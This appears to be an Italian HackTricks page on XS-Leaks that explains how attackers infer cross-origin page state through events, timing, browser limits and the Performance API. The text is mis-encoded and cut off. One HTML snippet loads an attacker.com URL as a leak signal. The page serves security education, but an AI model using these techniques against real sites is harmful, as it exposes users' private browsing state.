# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti della community pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informazioni di base

XS-Search √® un metodo utilizzato per **estrarre informazioni cross-origin** sfruttando **vulnerabilit√† di canale laterale**.

I componenti chiave coinvolti in questo attacco includono:

* **Web vulnerabile**: il sito web di destinazione da cui si desidera estrarre informazioni.
* **Web dell'attaccante**: il sito web malevolo creato dall'attaccante, che la vittima visita, ospitando l'exploit.
* **Metodo di inclusione**: la tecnica utilizzata per incorporare il Web vulnerabile nel Web dell'attaccante (ad esempio, window.open, iframe, fetch, tag HTML con href, ecc.).
* **Tecnica di leak**: tecniche utilizzate per individuare differenze nello stato del Web vulnerabile in base alle informazioni raccolte tramite il metodo di inclusione.
* **Stati**: le due condizioni potenziali del Web vulnerabile, che l'attaccante mira a distinguere.
* **Differenze rilevabili**: variazioni osservabili su cui l'attaccante si basa per inferire lo stato del Web vulnerabile.

### Differenze rilevabili

Diversi aspetti possono essere analizzati per differenziare gli stati del Web vulnerabile:

* **Codice di stato**: distinzione tra **vari codici di stato di risposta HTTP** cross-origin, come errori del server, errori del client o errori di autenticazione.
* **Utilizzo delle API**: identificazione dell'**utilizzo delle API Web** tra le pagine, rivelando se una pagina cross-origin utilizza una specifica API Web JavaScript.
* **Redirect**: rilevamento delle navigazioni verso pagine diverse, non solo reindirizzamenti HTTP ma anche quelli attivati da JavaScript o HTML.
* **Contenuto della pagina**: osservazione delle **variazioni nel corpo della risposta HTTP** o nelle risorse secondarie della pagina, come il **numero di frame incorporati** o disparit√† di dimensioni nelle immagini.
* **Intestazione HTTP**: rilevazione della presenza o eventualmente del valore di un **intestazione specifica della risposta HTTP**, inclusi gli header come X-Frame-Options, Content-Disposition e Cross-Origin-Resource-Policy.
* **Temporizzazione**: rilevazione di disparit√† di tempo coerenti tra i due stati.

### Metodi di inclusione

* **Elementi HTML**: HTML offre vari elementi per **l'inclusione di risorse cross-origin**, come fogli di stile, immagini o script, costringendo il browser a richiedere una risorsa non HTML. Una raccolta di potenziali elementi HTML per questo scopo pu√≤ essere trovata su [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frame**: Elementi come **iframe**, **object** e **embed** possono incorporare risorse HTML direttamente nella pagina dell'attaccante. Se la pagina **non ha protezione del framing**, JavaScript pu√≤ accedere all'oggetto window della risorsa inframe tramite la propriet√† contentWindow.
* **Pop-up**: Il metodo **`window.open`** apre una risorsa in una nuova scheda o finestra, fornendo un **handle della finestra** per consentire a JavaScript di interagire con metodi e propriet√† seguendo la SOP. I pop-up, spesso utilizzati nella procedura di accesso singolo, eludono le restrizioni di framing e cookie di una risorsa di destinazione. Tuttavia, i browser moderni limitano la creazione di pop-up a determinate azioni dell'utente.
* **Richieste JavaScript**: JavaScript consente richieste dirette alle risorse di destinazione utilizzando **XMLHttpRequests** o l'**API Fetch**. Questi metodi offrono un controllo preciso sulla richiesta, ad esempio scegliendo di seguire i reindirizzamenti HTTP.

### Tecniche di leak

* **Gestore di eventi**: una tecnica di leak classica in XS-Leaks, in cui i gestori di eventi come **onload** e **onerror** forniscono informazioni sul successo o il fallimento del caricamento delle risorse.
* **Messaggi di errore**: le eccezioni JavaScript o le pagine di errore speciali possono fornire informazioni di leak sia direttamente dal messaggio di errore che differenziando tra la sua presenza e assenza.
* **Limiti globali**: le limitazioni fisiche di un browser, come la capacit√† di memoria o altri limiti del browser imposti, possono segnalare quando viene raggiunto una soglia, fungendo da tecnica di leak.
* **Stato globale**: interazioni rilevabili con gli **stati globali** dei browser (ad esempio, l'interfaccia History) possono essere sfruttate. Ad esempio, il **numero di voci** nella cronologia di un browser pu√≤ offrire indizi sulle pagine cross-origin.
* **API delle prestazioni**: questa API fornisce **dettagli sulle prestazioni della pagina corrente**, inclusi i tempi di rete per il documento e le risorse caricate, consentendo inferenze sulle risorse richieste.
* **Attributi leggibili**: alcuni attributi HTML sono **leggibili cross-origin** e possono essere utilizzati come tecnica di leak. Ad esempio, la propriet√† `window.frame.length` consente a JavaScript di contare i frame inclusi in una pagina web cross-origin.

## Strumento e documento XSinator

XSinator √® uno strumento automatico per **verificare i browser contro diversi XS-Leaks noti** spiegati nel suo documento: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Puoi **accedere allo strumento su [https://xsinator.com/](https://xsinator.com/)**

{% hint style="warning" %}
**XS-Leaks esclusi**: Abbiamo dovuto escludere XS-Leaks che si basano su **service worker** in quanto interferirebbero con altri leak in XSinator. Inoltre, abbiamo scelto di **escludere XS-Leaks che si basano su errori di configurazione e bug in una specifica applicazione web**. Ad esempio, configurazioni errate di Cross-Origin Resource Sharing (CORS), perdite di postMessage o Cross-Site Scripting. Inoltre, abbiamo escluso gli XS-Leaks basati sul tempo poich√© spesso sono lenti, rumorosi e imprecisi.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti della community pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **Tecniche basate sul tempo**

Alcune delle seguenti tecniche utilizzano il tempo come parte del processo per rilevare differenze negli stati possibili delle pagine web. Ci sono diversi modi per misurare il tempo in un browser web.

**Orologi**: L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) consente agli sviluppatori di ottenere misurazioni temporali ad alta risoluzione.\
Ci sono un considerevole numero di API che gli attaccanti possono sfruttare per creare orologi impliciti: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animazioni CSS e altri.\
Per ulteriori informazioni: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tecniche degli eventi

### Onload/Onerror

* **Metodi di inclusione**: Frame, Elementi HTML
* **Differenza rilevabile**: Codice di stato
* **Ulteriori informazioni**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Sommario**: se si tenta di caricare una risorsa e vengono attivati gli eventi onerror/onload quando la risorsa viene caricata correttamente/non correttamente, √® possibile scoprire il codice di stato.
* **Esempio di codice**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

L'esempio di codice cerca di **caricare oggetti script da JS**, ma **altri tag** come oggetti, fogli di stile, immagini, audio potrebbero essere utilizzati. Inoltre, √® anche possibile iniettare direttamente il **tag** e dichiarare gli eventi `onload` e `onerror` all'interno del tag (anzich√© iniettarlo da JS).

Esiste anche una versione senza script di questo attacco:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In questo caso, se `example.com/404` non viene trovato, verr√† caricato `attacker.com/?error`.

### Onload Timing

* **Metodi di inclusione**: Elementi HTML
* **Differenza rilevabile**: Timing (generalmente dovuto al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Sommario**: L'API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pu√≤ essere utilizzata per misurare quanto tempo impiega una richiesta. Tuttavia, potrebbero essere utilizzati altri orologi, come l'API [**PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), che pu√≤ identificare attivit√† in esecuzione per pi√π di 50 ms.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un altro esempio in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Questa tecnica √® simile alla precedente, ma l'**attaccante** forzer√† anche alcune azioni per richiedere un **tempo significativo** quando la **risposta √® positiva o negativa** e misurare quel tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Metodi di inclusione**: Frame
* **Differenza rilevabile**: Timing (generalmente dovuto al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Sommario**: L'orologio [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pu√≤ essere utilizzato per misurare quanto tempo impiega una richiesta. Potrebbero essere utilizzati altri orologi.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Il tempo impiegato per recuperare una risorsa pu√≤ essere misurato utilizzando gli eventi [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). L'evento **`beforeunload`** viene attivato quando il browser sta per navigare verso una nuova pagina, mentre l'evento **`unload`** si verifica quando la navigazione √® effettivamente in corso. La differenza di tempo tra questi due eventi pu√≤ essere calcolata per determinare la **durata in cui il browser ha impiegato per recuperare la risorsa**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metodi di inclusione**: Frame
* **Differenza rilevabile**: Timing (generalmente dovuto al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Sommario**: L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pu√≤ essere utilizzata per misurare quanto tempo impiega una richiesta. Potrebbero essere utilizzati altri orologi.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

√à stato osservato che in assenza di [Protezioni di Framing](https://xsleaks.dev/docs/defenses/opt-in/xfo/), √® possibile misurare il tempo necessario per caricare una pagina e le sue risorse secondarie tramite la rete. Questa misurazione √® tipicamente possibile perch√© l'handler `onload` di un iframe viene attivato solo dopo il completamento del caricamento delle risorse e dell'esecuzione di JavaScript. Per eludere la variabilit√† introdotta dall'esecuzione dello script, un attaccante potrebbe utilizzare l'attributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) all'interno dell'`<iframe>`. L'inclusione di questo attributo limita numerose funzionalit√†, in particolare l'esecuzione di JavaScript, facilitando cos√¨ una misurazione che √® prevalentemente influenzata dalle prestazioni di rete.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + errore + onload

* **Metodi di inclusione**: Frames
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**:
* **Sommario**: Se riesci a far s√¨ che la pagina generi un errore quando si accede al contenuto corretto e che si carichi correttamente quando si accede a qualsiasi contenuto, puoi creare un loop per estrarre tutte le informazioni senza misurare il tempo.
* **Esempio di codice**:

Supponiamo che tu possa **inserire** la **pagina** che contiene il **contenuto segreto** all'interno di un Iframe.

Puoi far s√¨ che la vittima cerchi il file che contiene "_**flag**_" utilizzando un Iframe (sfruttando ad esempio un CSRF). All'interno dell'Iframe, sai che l'evento _**onload**_ verr√† **sempre eseguito almeno una volta**. Quindi, puoi **cambiare** l'**URL** dell'**iframe** cambiando solo il **contenuto** dell'**hash** all'interno dell'URL.

Ad esempio:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Se il primo URL √® stato **caricato correttamente**, allora, quando si **cambia** la parte **hash** dell'URL, l'evento **onload** **non verr√† attivato** di nuovo. Ma **se** la pagina ha avuto qualche tipo di **errore** durante il **caricamento**, allora, l'evento **onload** verr√† **attivato di nuovo**.

Quindi, puoi **distinguere tra** una pagina **caricata correttamente** o una pagina che ha un **errore** quando viene acceduta.

### Esecuzione di Javascript

* **Metodi di inclusione**: Frames
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**:
* **Sommario**: Se la **pagina** restituisce il **contenuto sensibile**, o un **contenuto** che pu√≤ essere **controllato** dall'utente. L'utente potrebbe impostare **codice JS valido nel caso negativo**, e **caricare** ogni tentativo all'interno di tag **`<script>`**, quindi nei casi **negativi** il codice degli attaccanti viene **eseguito**, e nei casi **affermativi** **nulla** verr√† eseguito.
* **Esempio di codice**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metodi di inclusione**: Elementi HTML
* **Differenza rilevabile**: Codice di stato e Intestazioni
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Sommario**: **Cross-Origin Read Blocking (CORB)** √® una misura di sicurezza che impedisce alle pagine web di caricare determinate risorse cross-origin sensibili per proteggersi da attacchi come **Spectre**. Tuttavia, gli attaccanti possono sfruttare il suo comportamento protettivo. Quando una risposta soggetta a **CORB** restituisce un `Content-Type` _**protetto da CORB**_ con `nosniff` e un codice di stato `2xx`, **CORB** rimuove il corpo e le intestazioni della risposta. Gli attaccanti che osservano ci√≤ possono dedurre la combinazione del **codice di stato** (che indica successo o errore) e del `Content-Type` (che indica se √® protetto da **CORB**), portando a una potenziale divulgazione di informazioni.
* **Esempio di codice**:

Consulta il link per ulteriori informazioni sull'attacco.

### onblur

* **Metodi di inclusione**: Frames
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Sommario**: Estrarre dati sensibili dall'attributo id o name.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

√à possibile **caricare una pagina** all'interno di un **iframe** e utilizzare **`#id_value`** per far s√¨ che la pagina **si concentri sull'elemento** dell'iframe indicato, quindi se viene attivato un segnale **`onblur`**, l'elemento ID esiste.\
Puoi eseguire lo stesso attacco con i tag **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metodi di inclusione**: Frames, Pop-up
* **Differenza rilevabile**: Utilizzo dell'API
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Sommario**: Raccogliere informazioni sensibili da un postMessage o utilizzare la presenza di postMessage come un oracolo per conoscere lo stato dell'utente nella pagina
* **Esempio di codice**: `Qualsiasi codice in ascolto di tutti i postMessage.`

Le applicazioni utilizzano frequentemente le **trasmissioni postMessage** per comunicare tra origini diverse. Tuttavia, questo metodo pu√≤ involontariamente esporre **informazioni sensibili** se il parametro `targetOrigin` non √® specificato correttamente, consentendo a qualsiasi finestra di ricevere i messaggi. Inoltre, il semplice atto di ricevere un messaggio pu√≤ fungere da **oracolo**; ad esempio, alcuni messaggi potrebbero essere inviati solo agli utenti che hanno effettuato l'accesso. Pertanto, la presenza o l'assenza di questi messaggi pu√≤ rivelare informazioni sullo stato o l'identit√† dell'utente, come ad esempio se sono autenticati o meno.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro basati sugli strumenti della comunit√† pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Tecniche di limiti globali

### WebSocket API

* **Metodi di inclusione**: Frames, Pop-up
* **Differenza rilevabile**: Utilizzo dell'API
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Sommario**: L'esaurimento del limite di connessioni WebSocket rivela il numero di connessioni WebSocket di una pagina cross-origin.
* **Esempio di codice**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

√à possibile identificare se, e quante, **connessioni WebSocket utilizza una pagina di destinazione**. Ci√≤ consente a un attaccante di rilevare gli stati dell'applicazione e di rivelare informazioni legate al numero di connessioni WebSocket.

Se un **origine** utilizza il **numero massimo di oggetti di connessione WebSocket**, indipendentemente dallo stato delle connessioni, la creazione di **nuovi oggetti provocher√† eccezioni JavaScript**. Per eseguire questo attacco, il sito web dell'attaccante apre il sito web di destinazione in un pop-up o iframe e quindi, dopo che il sito web di destinazione √® stato caricato, tenta di creare il numero massimo di connessioni WebSocket possibili. Il **numero di eccezioni generate** corrisponde al **numero di connessioni WebSocket utilizzate dal sito web di destinazione**.
### API di pagamento

* **Metodi di inclusione**: Frames, Pop-up
* **Differenza rilevabile**: Utilizzo dell'API
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Sommario**: Rileva la richiesta di pagamento perch√© pu√≤ essere attiva solo una alla volta.
* **Esempio di codice**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Questo XS-Leak consente a un attaccante di **rilevare quando una pagina cross-origin avvia una richiesta di pagamento**.

Poich√© **pu√≤ essere attiva solo una richiesta di pagamento**, se il sito di destinazione utilizza l'API di richiesta di pagamento, qualsiasi **ulteriore tentativo di utilizzare questa API fallir√†** e causer√† un'**eccezione JavaScript**. L'attaccante pu√≤ sfruttare ci√≤ tentando periodicamente di mostrare l'interfaccia dell'API di pagamento. Se un tentativo causa un'eccezione, il sito di destinazione la sta utilizzando attualmente. L'attaccante pu√≤ nascondere questi tentativi periodici chiudendo immediatamente l'interfaccia dopo la creazione.

### Misurare il ciclo degli eventi <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metodi di inclusione**:
* **Differenza rilevabile**: Temporizzazione (generalmente dovuta al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Sommario**: Misura il tempo di esecuzione di un'applicazione web sfruttando il ciclo degli eventi JS a thread singolo.
* **Esempio di codice**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript opera su un modello di concorrenza del ciclo degli eventi a **thread singolo**, il che significa che **pu√≤ eseguire solo un'attivit√† alla volta**. Questa caratteristica pu√≤ essere sfruttata per misurare **quanto tempo impiega il codice di un'origine diversa per eseguire**. Un attaccante pu√≤ misurare il tempo di esecuzione del proprio codice nel ciclo degli eventi inviando continuamente eventi con propriet√† fisse. Questi eventi verranno elaborati quando il pool degli eventi √® vuoto. Se altre origini stanno anche inviando eventi allo stesso pool, un **attaccante pu√≤ dedurre il tempo impiegato per l'esecuzione di questi eventi esterni osservando i ritardi nell'esecuzione dei propri compiti**. Questo metodo di monitoraggio del ciclo degli eventi per i ritardi pu√≤ rivelare il tempo di esecuzione del codice di origini diverse, mettendo potenzialmente a rischio informazioni sensibili.

{% hint style="warning" %}
In una temporizzazione dell'esecuzione √® possibile **eliminare** i **fattori di rete** per ottenere **misure pi√π precise**. Ad esempio, caricando le risorse utilizzate dalla pagina prima di caricarla.
{% endhint %}

### Ciclo degli eventi occupato <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metodi di inclusione**:
* **Differenza rilevabile**: Temporizzazione (generalmente dovuta al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Sommario**: Un metodo per misurare il tempo di esecuzione di un'operazione web consiste nel bloccare intenzionalmente il ciclo degli eventi di un thread e quindi misurare **quanto tempo impiega il ciclo degli eventi per diventare nuovamente disponibile**. Inserendo un'operazione di blocco (come un calcolo lungo o una chiamata API sincrona) nel ciclo degli eventi e monitorando il tempo impiegato per l'esecuzione successiva del codice, √® possibile dedurre la durata dei compiti che sono stati eseguiti nel ciclo degli eventi durante il periodo di blocco. Questa tecnica sfrutta la natura a thread singolo del ciclo degli eventi di JavaScript, in cui i compiti vengono eseguiti in sequenza, e pu√≤ fornire informazioni sulle prestazioni o il comportamento di altre operazioni che condividono lo stesso thread.
* **Esempio di codice**:

Un vantaggio significativo della tecnica di misurazione del tempo di esecuzione bloccando il ciclo degli eventi √® la sua capacit√† di aggirare l'**Isolamento del sito**. L'**Isolamento del sito** √® una funzionalit√† di sicurezza che separa diversi siti web in processi separati, al fine di impedire ai siti maligni di accedere direttamente a dati sensibili di altri siti. Tuttavia, influenzando la temporizzazione dell'esecuzione di un'altra origine attraverso il ciclo degli eventi condiviso, un attaccante pu√≤ estrarre indirettamente informazioni sulle attivit√† di quell'origine. Questo metodo non si basa sull'accesso diretto ai dati dell'altra origine, ma osserva l'impatto delle attivit√† di quell'origine sul ciclo degli eventi condiviso, eludendo cos√¨ le barriere protettive stabilite dall'**Isolamento del sito**.

{% hint style="warning" %}
In una temporizzazione dell'esecuzione √® possibile **eliminare** i **fattori di rete** per ottenere **misure pi√π precise**. Ad esempio, caricando le risorse utilizzate dalla pagina prima di caricarla.
{% endhint %}

### Pool di connessioni

* **Metodi di inclusione**: Richieste JavaScript
* **Differenza rilevabile**: Temporizzazione (generalmente dovuta al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Sommario**: Un attaccante potrebbe bloccare tutte le socket tranne una, caricare la pagina di destinazione e contemporaneamente caricare un'altra pagina, il tempo fino all'inizio del caricamento dell'ultima pagina √® il tempo impiegato dalla pagina di destinazione per caricarsi.
* **Esempio di codice**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

I browser utilizzano le socket per la comunicazione con il server, ma a causa delle risorse limitate del sistema operativo e dell'hardware, i **browser sono costretti a imporre un limite** sul numero di socket simultanee. Gli attaccanti possono sfruttare questa limitazione seguendo i seguenti passaggi:

1. Verificare il limite di socket del browser, ad esempio 256 socket globali.
2. Occupare 255 socket per un periodo prolungato avviando 255 richieste a host diversi, progettate per mantenere le connessioni aperte senza completarle.
3. Utilizzare la 256¬™ socket per inviare una richiesta alla pagina di destinazione.
4. Tentare una 257¬™ richiesta a un host diverso. Dato che tutte le socket sono in uso (come indicato dai passaggi 2 e 3), questa richiesta verr√† messa in coda fino a quando una socket non diventa disponibile. Il ritardo prima che questa richiesta venga elaborata fornisce all'attaccante informazioni temporali sull'attivit√† di rete relativa alla 256¬™ socket (la socket della pagina di destinazione). Questa inferenza √® possibile perch√© le 255 socket del passaggio 2 sono ancora impegnate, il che implica che qualsiasi socket appena disponibile deve essere quella rilasciata dal passaggio 3. Il tempo impiegato dalla 256¬™ socket per diventare disponibile √® quindi direttamente correlato al tempo necessario per completare la richiesta alla pagina di destinazione.


Per ulteriori informazioni: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool di connessioni per destinazione

* **Metodi di inclusione**: Richieste JavaScript
* **Differenza rilevabile**: Temporizzazione (generalmente dovuta al contenuto della pagina, al codice di stato)
* **Ulteriori informazioni**:
* **Sommario**: √à simile alla tecnica precedente, ma invece di utilizzare tutte le socket, Google **Chrome** impone un limite di **6 richieste simultanee allo stesso origin**. Se **blocciamo 5** e quindi **lanciamo una sesta** richiesta, possiamo **misurarne il tempo** e se riusciamo a far s√¨ che la **pagina vittima invii** ulteriori **richieste** allo stesso endpoint per rilevare lo **stato** della **pagina**, la **sesta richiesta** impiegher√† **pi√π tempo** e possiamo rilevarlo.
## Tecniche API di Performance

L'API di Performance offre informazioni sulle metriche di performance delle applicazioni web, arricchite ulteriormente dall'API di Resource Timing. L'API di Resource Timing consente il monitoraggio dettagliato dei tempi di richiesta di rete, come la durata delle richieste. In particolare, quando i server includono l'intestazione `Timing-Allow-Origin: *` nelle loro risposte, diventano disponibili ulteriori dati come la dimensione del trasferimento e il tempo di ricerca del dominio.

Questo ricco insieme di dati pu√≤ essere recuperato tramite metodi come `performance.getEntries` o `performance.getEntriesByName`, fornendo una visione completa delle informazioni relative alle prestazioni. Inoltre, l'API facilita la misurazione dei tempi di esecuzione calcolando la differenza tra i timestamp ottenuti da `performance.now()`. Tuttavia, √® importante notare che per alcune operazioni nei browser come Chrome, la precisione di `performance.now()` pu√≤ essere limitata a millisecondi, il che potrebbe influire sulla granularit√† delle misurazioni temporali.

Oltre alle misurazioni temporali, l'API di Performance pu√≤ essere sfruttata per ottenere informazioni legate alla sicurezza. Ad esempio, la presenza o l'assenza di pagine nell'oggetto `performance` in Chrome pu√≤ indicare l'applicazione di `X-Frame-Options`. In particolare, se una pagina viene bloccata dal rendering in un frame a causa di `X-Frame-Options`, non verr√† registrata nell'oggetto `performance`, fornendo un indizio sottile sulle politiche di framing della pagina.

### Fuga di Errori

* **Metodi di Inclusione**: Frame, Elementi HTML
* **Differenza Rilevabile**: Codice di Stato
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: Una richiesta che genera errori non crea una voce di timing delle risorse.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

√à possibile **distinguere tra i codici di stato delle risposte HTTP** perch√© le richieste che generano un **errore** non creano una voce di performance.

### Errore di Ricarica dello Stile

* **Metodi di Inclusione**: Elementi HTML
* **Differenza Rilevabile**: Codice di Stato
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: A causa di un bug del browser, le richieste che generano errori vengono caricate due volte.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Nella tecnica precedente sono stati identificati anche due casi in cui i bug del browser in GC portano al caricamento **doppio delle risorse quando non riescono a caricare**. Ci√≤ comporta la presenza di voci multiple nell'API di Performance e pu√≤ quindi essere rilevato.

### Errore di Unione delle Richieste

* **Metodi di Inclusione**: Elementi HTML
